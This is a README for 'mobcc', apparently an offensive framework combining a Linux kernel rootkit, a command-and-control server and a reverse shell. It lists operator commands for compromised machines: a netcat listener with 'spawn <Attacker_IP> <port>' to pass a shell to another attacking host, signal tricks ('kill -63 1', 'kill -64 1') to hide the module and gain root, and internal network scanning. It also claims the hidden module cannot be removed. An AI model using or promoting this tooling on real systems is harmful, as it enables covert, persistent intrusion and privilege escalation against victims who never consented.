# mobcc

Mob CC is a framework containing a Linux kernel rootkit, C2 server and Reverse shell with network scanning capabilities.


Add Devices using the below link. (If you are using the kernel module then this step will be automatically done by that.)

Select the added Device and start sending commands to the target system.

As you may directly get root access but incase you don't get root access then check commands to gain root privilege.

You can also spawn a new shell and transfer it to any other attacking system by giving the IP of the attacking system.



# Note:
Note that if you kill the reverse shell process then you have to install the kernel rootkit module again into the target system.

No one can remove the module if it's hidden.


# Help

To spawn a new shell from different device. eg:'nc -lvnp &lt;port&gt;' | 'spawn &lt;Attacker_IP&gt; &lt;port&gt;'

To scan the internal network from the target system. 'scan'

To kill the connection (reverse shell process) type. 'kill -9 &lt;pid&gt;'

To toggle between hide and show the kernel module. 'kill -63 1'

To gain root privilege in the target machine from any other attacking machine using reverse shell like above.'kill -64 1'





Resource: Linux Kernel rootkit
https://xcellerator.github.io/posts/linux_rootkits_01/
